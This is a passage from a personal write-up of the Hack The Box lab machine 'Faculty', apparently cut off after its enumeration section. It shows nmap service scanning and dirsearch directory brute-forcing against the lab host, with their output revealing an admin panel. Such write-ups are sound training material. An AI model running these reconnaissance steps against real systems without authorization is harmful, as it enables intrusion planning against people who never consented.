<!doctype html>
<html class="no-js" lang="en" data-content_root="">
  <head><meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width,initial-scale=1"/>
    <meta name="color-scheme" content="light dark"><meta name="viewport" content="width=device-width, initial-scale=1" />

    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-2TCTE0JE23"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'G-2TCTE0JE23');
    </script>
        <link href="../../../../_static/lazer_fox.png" sizes="300x300" rel="icon" type="image/png"><link rel="index" title="Index" href="../../../../genindex.html" /><link rel="search" title="Search" href="../../../../search.html" /><link rel="next" title="Forgot" href="../forgot/forgot.html" /><link rel="prev" title="Awkward" href="../awkward/awkward.html" />

    <!-- Generated with Sphinx 7.1.2 and Furo 2023.08.19 -->
        <title>Faculty - blnkn&#39;s notes</title>
      <link rel="stylesheet" type="text/css" href="../../../../_static/pygments.css?v=8f2a1f02" />
    <link rel="stylesheet" type="text/css" href="../../../../_static/styles/furo.css?v=135e06be" />
    <link rel="stylesheet" type="text/css" href="../../../../_static/styles/furo-extensions.css?v=36a5483c" />
    
    


<style>
  body {
    --color-code-background: #f8f8f8;
  --color-code-foreground: black;
  
  }
  @media not print {
    body[data-theme="dark"] {
      --color-code-background: #202020;
  --color-code-foreground: #d0d0d0;
  
    }
    @media (prefers-color-scheme: dark) {
      body:not([data-theme="light"]) {
        --color-code-background: #202020;
  --color-code-foreground: #d0d0d0;
  
      }
    }
  }
</style></head>
  <body>
    
    <script>
      document.body.dataset.theme = localStorage.getItem("theme") || "auto";
    </script>
    

<svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
  <symbol id="svg-toc" viewBox="0 0 24 24">
    <title>Contents</title>
    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024">
      <path d="M408 442h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8zm-8 204c0 4.4 3.6 8 8 8h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56zm504-486H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm0 632H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zM115.4 518.9L271.7 642c5.8 4.6 14.4.5 14.4-6.9V388.9c0-7.4-8.5-11.5-14.4-6.9L115.4 505.1a8.74 8.74 0 0 0 0 13.8z"/>
    </svg>
  </symbol>
  <symbol id="svg-menu" viewBox="0 0 24 24">
    <title>Menu</title>
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-menu">
      <line x1="3" y1="12" x2="21" y2="12"></line>
      <line x1="3" y1="6" x2="21" y2="6"></line>
      <line x1="3" y1="18" x2="21" y2="18"></line>
    </svg>
  </symbol>
  <symbol id="svg-arrow-right" viewBox="0 0 24 24">
    <title>Expand</title>
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-chevron-right">
      <polyline points="9 18 15 12 9 6"></polyline>
    </svg>
  </symbol>
  <symbol id="svg-sun" viewBox="0 0 24 24">
    <title>Light mode</title>
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="feather-sun">
      <circle cx="12" cy="12" r="5"></circle>
      <line x1="12" y1="1" x2="12" y2="3"></line>
      <line x1="12" y1="21" x2="12" y2="23"></line>
      <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
      <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
      <line x1="1" y1="12" x2="3" y2="12"></line>
      <line x1="21" y1="12" x2="23" y2="12"></line>
      <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
      <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
    </svg>
  </symbol>
  <symbol id="svg-moon" viewBox="0 0 24 24">
    <title>Dark mode</title>
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-moon">
      <path stroke="none" d="M0 0h24v24H0z" fill="none" />
      <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z" />
    </svg>
  </symbol>
  <symbol id="svg-sun-half" viewBox="0 0 24 24">
    <title>Auto light/dark mode</title>
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-shadow">
      <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
      <circle cx="12" cy="12" r="9" />
      <path d="M13 12h5" />
      <path d="M13 15h4" />
      <path d="M13 18h1" />
      <path d="M13 9h4" />
      <path d="M13 6h1" />
    </svg>
  </symbol>
</svg>

<input type="checkbox" class="sidebar-toggle" name="__navigation" id="__navigation">
<input type="checkbox" class="sidebar-toggle" name="__toc" id="__toc">
<label class="overlay sidebar-overlay" for="__navigation">
  <div class="visually-hidden">Hide navigation sidebar</div>
</label>
<label class="overlay toc-overlay" for="__toc">
  <div class="visually-hidden">Hide table of contents sidebar</div>
</label>



<div class="page">
  <header class="mobile-header">
    <div class="header-left">
      <label class="nav-overlay-icon" for="__navigation">
        <div class="visually-hidden">Toggle site navigation sidebar</div>
        <i class="icon"><svg><use href="#svg-menu"></use></svg></i>
      </label>
    </div>
    <div class="header-center">
      <a href="../../../../index.html"><div class="brand">blnkn's notes</div></a>
    </div>
    <div class="header-right">
      <div class="theme-toggle-container theme-toggle-header">
        <button class="theme-toggle">
          <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
          <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
          <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
          <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
        </button>
      </div>
      <label class="toc-overlay-icon toc-header-icon" for="__toc">
        <div class="visually-hidden">Toggle table of contents sidebar</div>
        <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
      </label>
    </div>
  </header>
  <aside class="sidebar-drawer">
    <div class="sidebar-container">
      
      <div class="sidebar-sticky"><a class="sidebar-brand" href="../../../../index.html">
  
  <div class="sidebar-logo-container">
    <img class="sidebar-logo" src="../../../../_static/lazer_fox.png" alt="Logo"/>
  </div>
  
  <span class="sidebar-brand-text">blnkn's notes</span>
  
</a><form class="sidebar-search-container" method="get" action="../../../../search.html" role="search">
  <input class="sidebar-search" placeholder="Search" name="q" aria-label="Search">
  <input type="hidden" name="check_keywords" value="yes">
  <input type="hidden" name="area" value="default">
</form>
<div id="searchbox"></div><div class="sidebar-scroll"><div class="sidebar-tree">
  <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
<ul class="current">
<li class="toctree-l1 current has-children"><a class="reference internal" href="../../../htb.html">Hack The Box</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-1" name="toctree-checkbox-1" role="switch" type="checkbox"/><label for="toctree-checkbox-1"><div class="visually-hidden">Toggle navigation of Hack The Box</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
<li class="toctree-l2 has-children"><a class="reference internal" href="../../../academy/academy.html">Academy</a><input class="toctree-checkbox" id="toctree-checkbox-2" name="toctree-checkbox-2" role="switch" type="checkbox"/><label for="toctree-checkbox-2"><div class="visually-hidden">Toggle navigation of Academy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/active-directory/active-directory.html">Active Directory</a><input class="toctree-checkbox" id="toctree-checkbox-3" name="toctree-checkbox-3" role="switch" type="checkbox"/><label for="toctree-checkbox-3"><div class="visually-hidden">Toggle navigation of Active Directory</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/active-directory-enum-and-attacks/active-directory-enum-and-attacks.html">Active Directory Enum and Attacks</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/ad/ad.html">Active Directory</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/ad/ad.html#user-account-control-values">User Account Control Values</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/kerberos/kerberos.html">Kerberos</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/windows-auth/windows-auth.html">Windows Authentication</a></li>
</ul>
</li>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/buffer-overflows/buffer-overflows.html">Buffer Overflows</a><input class="toctree-checkbox" id="toctree-checkbox-4" name="toctree-checkbox-4" role="switch" type="checkbox"/><label for="toctree-checkbox-4"><div class="visually-hidden">Toggle navigation of Buffer Overflows</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/buffer-overflows/linux-buffer-overflows/linux-buffer-overflows.html">Linux Buffer Overflows</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../../../academy/hashcat/hashcat.html">Hashcat</a></li>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/os-fundamentals/os-fundamentals.html">OS Fundamentals</a><input class="toctree-checkbox" id="toctree-checkbox-5" name="toctree-checkbox-5" role="switch" type="checkbox"/><label for="toctree-checkbox-5"><div class="visually-hidden">Toggle navigation of OS Fundamentals</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/os-fundamentals/windows-fundamentals/windows-fundamentals.html">Windows OS Fundamentals</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../../../academy/sqli/sqli.html">SQLi</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../academy/webapp/webapp.html">Web Apps</a></li>
</ul>
</li>
<li class="toctree-l2 current has-children"><a class="reference internal" href="../../machines.html">Lab Machines</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-6" name="toctree-checkbox-6" role="switch" type="checkbox"/><label for="toctree-checkbox-6"><div class="visually-hidden">Toggle navigation of Lab Machines</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
<li class="toctree-l3 has-children"><a class="reference internal" href="../../hard/hard.html">Hard</a><input class="toctree-checkbox" id="toctree-checkbox-7" name="toctree-checkbox-7" role="switch" type="checkbox"/><label for="toctree-checkbox-7"><div class="visually-hidden">Toggle navigation of Hard</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l4"><a class="reference internal" href="../../hard/snoopy/snoopy.html">Snoopy</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../hard/vintage/vintage.html">Vintage</a></li>
</ul>
</li>
<li class="toctree-l3 current has-children"><a class="reference internal" href="../medium.html">Medium</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-8" name="toctree-checkbox-8" role="switch" type="checkbox"/><label for="toctree-checkbox-8"><div class="visually-hidden">Toggle navigation of Medium</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
<li class="toctree-l4"><a class="reference internal" href="../administrator/administrator.html">Administrator</a></li>
<li class="toctree-l4"><a class="reference internal" href="../ambassador/ambassador.html">Ambassador</a></li>
<li class="toctree-l4"><a class="reference internal" href="../authority/authority.html">Authority</a></li>
<li class="toctree-l4"><a class="reference internal" href="../awkward/awkward.html">Awkward</a></li>
<li class="toctree-l4 current current-page"><a class="current reference internal" href="#">Faculty</a></li>
<li class="toctree-l4"><a class="reference internal" href="../forgot/forgot.html">Forgot</a></li>
<li class="toctree-l4"><a class="reference internal" href="../format/format.html">Format</a></li>
<li class="toctree-l4"><a class="reference internal" href="../health/health.html">Health</a></li>
<li class="toctree-l4"><a class="reference internal" href="../jupiter/jupiter.html">Jupiter</a></li>
<li class="toctree-l4"><a class="reference internal" href="../manager/manager.html">Manager</a></li>
<li class="toctree-l4"><a class="reference internal" href="../mentor/mentor.html">Mentor</a></li>
<li class="toctree-l4"><a class="reference internal" href="../only4you/only4you.html">Only4you</a></li>
<li class="toctree-l4"><a class="reference internal" href="../outdated/outdated.html">Outdated</a></li>
<li class="toctree-l4"><a class="reference internal" href="../sandworm/sandworm.html">Sandworm</a></li>
<li class="toctree-l4"><a class="reference internal" href="../scrambled/scrambled.html">Scrambled</a></li>
<li class="toctree-l4"><a class="reference internal" href="../shared/shared.html">Shared</a></li>
<li class="toctree-l4"><a class="reference internal" href="../thefrizz/thefrizz.html">The Frizz</a></li>
<li class="toctree-l4"><a class="reference internal" href="../updown/updown.html">Updown</a></li>
<li class="toctree-l4"><a class="reference internal" href="../zipping/zipping.html">Zipping</a></li>
</ul>
</li>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../easy/easy.html">Easy</a><input class="toctree-checkbox" id="toctree-checkbox-9" name="toctree-checkbox-9" role="switch" type="checkbox"/><label for="toctree-checkbox-9"><div class="visually-hidden">Toggle navigation of Easy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l4"><a class="reference internal" href="../../easy/analytics/analytics.html">Analytics</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/busqueda/busqueda.html">Busqueda</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/code/code.html">Code</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/codify/codify.html">Codify</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/dog/dog.html">Dog</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/escapetwo/escapetwo.html">Escape Two</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/inject/inject.html">Inject</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/keeper/keeper.html">Keeper</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/metatwo/metatwo.html">Meta two</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/monitorstwo/monitorstwo.html">Monitors two</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/pc/pc.html">Pc</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/photobomb/photobomb.html">Photobomb</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/pilgrimage/pilgrimage.html">Pilgrimage</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/precious/precious.html">Precious</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/red_panda/red_panda.html">Red panda</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/sau/sau.html">Sau</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/shoppy/shoppy.html">Shoppy</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/soccer/soccer.html">Soccer</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/stocker/stocker.html">Stocker</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/support/support.html">Support</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/topology/topology.html">Topology</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/trick/trick.html">Trick</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../pg/pg.html">Proving Grounds</a><input class="toctree-checkbox" id="toctree-checkbox-10" name="toctree-checkbox-10" role="switch" type="checkbox"/><label for="toctree-checkbox-10"><div class="visually-hidden">Toggle navigation of Proving Grounds</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l2"><a class="reference internal" href="../../../../pg/ha_natraj/ha_natraj.html">Ha Natraj</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../pg/sunset_decoy/sunset_decoy.html">Sunset Decoy</a></li>
</ul>
</li>
<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../dvwa/dvwa.html">DVWA</a><input class="toctree-checkbox" id="toctree-checkbox-11" name="toctree-checkbox-11" role="switch" type="checkbox"/><label for="toctree-checkbox-11"><div class="visually-hidden">Toggle navigation of DVWA</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l2"><a class="reference internal" href="../../../../dvwa/sqli_blind/sqli_blind.html">Blind SQLi</a></li>
</ul>
</li>
<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../other/other.html">Other</a><input class="toctree-checkbox" id="toctree-checkbox-12" name="toctree-checkbox-12" role="switch" type="checkbox"/><label for="toctree-checkbox-12"><div class="visually-hidden">Toggle navigation of Other</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/assembly/assembly.html">Assembly</a></li>
<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../other/aws-ccp/aws-ccp.html">AWS-CCP</a><input class="toctree-checkbox" id="toctree-checkbox-13" name="toctree-checkbox-13" role="switch" type="checkbox"/><label for="toctree-checkbox-13"><div class="visually-hidden">Toggle navigation of AWS-CCP</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/1-foundations-of-cloud-computing.html">Foundations of Cloud Computing</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/2-technology.html">Technologies</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/3-security-and-compliance.html">Security and Compliance</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/4-pricing-billing-and-governance.html">Pricing Billing and Governance</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/codebashing/codebashing.html">Codebashing</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/dba/dba.html">Database Administration</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/dorking/dorking.html">Google dork cheatsheet</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/empire/empire.html">Empire</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/hashes/hashes.html">Hashes</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/irssi/irssi.html">Irssi</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/metasploit/metasploit.html">Metasploit framework</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/nmap/nmap.html">Nmap</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/reconstructing-private-key/reconstructing-private-key.html">Reconstructing a Private Key</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/rfid/rfid.html">RFID</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/server-hardening/server-hardening.html">Server Hardening</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/shells/shells.html">Reverse Shells</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/stego/stego.html">Steganography</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/tcpdump-vuln/tcpdump-vuln.html">TCPdump</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/wordlists/wordlists.html">Making Custom Wordlists</a></li>
<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../other/c/c.html">C</a><input class="toctree-checkbox" id="toctree-checkbox-14" name="toctree-checkbox-14" role="switch" type="checkbox"/><label for="toctree-checkbox-14"><div class="visually-hidden">Toggle navigation of C</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l3"><a class="reference internal" href="../../../../other/c/execution-methods.html">C Execution methods</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/air-ungap/air-ungap.html">Air-Ungap</a></li>
</ul>
</li>
</ul>

</div>
</div>

      </div>
      
    </div>
  </aside>
  <div class="main">
    <div class="content">
      <div class="article-container">
        <a href="#" class="back-to-top muted-link">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"></path>
          </svg>
          <span>Back to top</span>
        </a>
        <div class="content-icon-container">
          
<div class="theme-toggle-container theme-toggle-content">
            <button class="theme-toggle">
              <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
              <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
              <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
              <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
            </button>
          </div>
          <label class="toc-overlay-icon toc-content-icon" for="__toc">
            <div class="visually-hidden">Toggle table of contents sidebar</div>
            <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
          </label>
        </div>
        <article role="main">
          <p><img alt="faculty.png" src="../../../../_images/faculty.png" /></p>
<section id="faculty">
<h1>Faculty<a class="headerlink" href="#faculty" title="Permalink to this heading">#</a></h1>
<section id="enum">
<h2>enum<a class="headerlink" href="#enum" title="Permalink to this heading">#</a></h2>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>faculty.htb<span class="w"> </span>-oN<span class="w"> </span>nmap.initial<span class="w">  </span><span class="m">130</span><span class="w"> </span>⨯
Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.92<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2022</span>-10-16<span class="w"> </span><span class="m">09</span>:17<span class="w"> </span>IST
Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span>faculty.htb<span class="w"> </span><span class="o">(</span><span class="m">10</span>.10.11.169<span class="o">)</span>
Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.045s<span class="w"> </span>latency<span class="o">)</span>.
Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">998</span><span class="w"> </span>closed<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>conn-refused<span class="o">)</span>
PORT<span class="w">   </span>STATE<span class="w"> </span>SERVICE<span class="w"> </span>VERSION
<span class="m">22</span>/tcp<span class="w"> </span>open<span class="w">  </span>ssh<span class="w">     </span>OpenSSH<span class="w"> </span><span class="m">8</span>.2p1<span class="w"> </span>Ubuntu<span class="w"> </span>4ubuntu0.5<span class="w"> </span><span class="o">(</span>Ubuntu<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>protocol<span class="w"> </span><span class="m">2</span>.0<span class="o">)</span>
<span class="p">|</span><span class="w"> </span>ssh-hostkey:
<span class="p">|</span><span class="w">   </span><span class="m">3072</span><span class="w"> </span>e9:41:8c:e5:54:4d:6f:14:98:76:16:e7:29:2d:02:16<span class="w"> </span><span class="o">(</span>RSA<span class="o">)</span>
<span class="p">|</span><span class="w">   </span><span class="m">256</span><span class="w"> </span><span class="m">43</span>:75:10:3e:cb:78:e9:52:0e:eb:cf:7f:fd:f6:6d:3d<span class="w"> </span><span class="o">(</span>ECDSA<span class="o">)</span>
<span class="p">|</span>_<span class="w">  </span><span class="m">256</span><span class="w"> </span>c1:1c:af:76:2b:56:e8:b3:b8:8a:e9:69:73:7b:e6:f5<span class="w"> </span><span class="o">(</span>ED25519<span class="o">)</span>
<span class="m">80</span>/tcp<span class="w"> </span>open<span class="w">  </span>http<span class="w">    </span>nginx<span class="w"> </span><span class="m">1</span>.18.0<span class="w"> </span><span class="o">(</span>Ubuntu<span class="o">)</span>
<span class="p">|</span><span class="w"> </span>http-cookie-flags:
<span class="p">|</span><span class="w">   </span>/:
<span class="p">|</span><span class="w">     </span>PHPSESSID:
<span class="p">|</span>_<span class="w">      </span>httponly<span class="w"> </span>flag<span class="w"> </span>not<span class="w"> </span><span class="nb">set</span>
<span class="p">|</span>_http-server-header:<span class="w"> </span>nginx/1.18.0<span class="w"> </span><span class="o">(</span>Ubuntu<span class="o">)</span>
<span class="p">|</span><span class="w"> </span>http-title:<span class="w"> </span>School<span class="w"> </span>Faculty<span class="w"> </span>Scheduling<span class="w"> </span>System
<span class="p">|</span>_Requested<span class="w"> </span>resource<span class="w"> </span>was<span class="w"> </span>login.php
Service<span class="w"> </span>Info:<span class="w"> </span>OS:<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:linux:linux_kernel

Service<span class="w"> </span>detection<span class="w"> </span>performed.<span class="w"> </span>Please<span class="w"> </span>report<span class="w"> </span>any<span class="w"> </span>incorrect<span class="w"> </span>results<span class="w"> </span>at<span class="w"> </span>https://nmap.org/submit/<span class="w"> </span>.
Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">8</span>.53<span class="w"> </span>seconds
zsh:<span class="w"> </span>segmentation<span class="w"> </span>fault<span class="w">  </span>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>faculty.htb<span class="w"> </span>-oN<span class="w"> </span>nmap.initial
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>dirsearch<span class="w"> </span>-u<span class="w"> </span>http://faculty.htb/<span class="w">           </span><span class="m">130</span><span class="w"> </span>⨯

<span class="w">  </span>_<span class="p">|</span>.<span class="w"> </span>_<span class="w"> </span>_<span class="w">  </span>_<span class="w">  </span>_<span class="w">  </span>_<span class="w"> </span>_<span class="p">|</span>_<span class="w">    </span>v0.4.2
<span class="w"> </span><span class="o">(</span>_<span class="o">||</span><span class="p">|</span><span class="w"> </span>_<span class="o">)</span><span class="w"> </span><span class="o">(</span>/_<span class="o">(</span>_<span class="o">||</span><span class="w"> </span><span class="o">(</span>_<span class="p">|</span><span class="w"> </span><span class="o">)</span>

Extensions:<span class="w"> </span>php,<span class="w"> </span>aspx,<span class="w"> </span>jsp,<span class="w"> </span>html,<span class="w"> </span>js<span class="w"> </span><span class="p">|</span><span class="w"> </span>HTTP<span class="w"> </span>method:<span class="w"> </span>GET<span class="w"> </span><span class="p">|</span><span class="w"> </span>Threads:<span class="w"> </span><span class="m">30</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Wordlist<span class="w"> </span>size:<span class="w"> </span><span class="m">10927</span>

Output<span class="w"> </span>File:<span class="w"> </span>/home/blnkn/.dirsearch/reports/faculty.htb/-_22-10-16_09-14-49.txt

Error<span class="w"> </span>Log:<span class="w"> </span>/home/blnkn/.dirsearch/logs/errors-22-10-16_09-14-49.log

Target:<span class="w"> </span>http://faculty.htb/

<span class="o">[</span><span class="m">09</span>:14:49<span class="o">]</span><span class="w"> </span>Starting:
<span class="o">[</span><span class="m">09</span>:14:54<span class="o">]</span><span class="w"> </span><span class="m">301</span><span class="w"> </span>-<span class="w">  </span>178B<span class="w">  </span>-<span class="w"> </span>/admin<span class="w">  </span>-&gt;<span class="w">  </span>http://faculty.htb/admin/
<span class="o">[</span><span class="m">09</span>:14:55<span class="o">]</span><span class="w"> </span><span class="m">302</span><span class="w"> </span>-<span class="w">   </span>14KB<span class="w"> </span>-<span class="w"> </span>/admin/<span class="w">  </span>-&gt;<span class="w">  </span>login.php
<span class="o">[</span><span class="m">09</span>:14:55<span class="o">]</span><span class="w"> </span><span class="m">302</span><span class="w"> </span>-<span class="w">   </span>14KB<span class="w"> </span>-<span class="w"> </span>/admin/?/login<span class="w">  </span>-&gt;<span class="w">  </span>login.php
<span class="o">[</span><span class="m">09</span>:14:55<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">   </span>17B<span class="w">  </span>-<span class="w"> </span>/admin/download.php
<span class="o">[</span><span class="m">09</span>:14:55<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">    </span>3KB<span class="w"> </span>-<span class="w"> </span>/admin/home.php
<span class="o">[</span><span class="m">09</span>:14:55<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">    </span>5KB<span class="w"> </span>-<span class="w"> </span>/admin/login.php
<span class="o">[</span><span class="m">09</span>:14:55<span class="o">]</span><span class="w"> </span><span class="m">302</span><span class="w"> </span>-<span class="w">   </span>14KB<span class="w"> </span>-<span class="w"> </span>/admin/index.php<span class="w">  </span>-&gt;<span class="w">  </span>login.php
<span class="o">[</span><span class="m">09</span>:15:02<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">    </span>3KB<span class="w"> </span>-<span class="w"> </span>/header.php
<span class="o">[</span><span class="m">09</span>:15:02<span class="o">]</span><span class="w"> </span><span class="m">302</span><span class="w"> </span>-<span class="w">   </span>12KB<span class="w"> </span>-<span class="w"> </span>/index.php<span class="w">  </span>-&gt;<span class="w">  </span>login.php
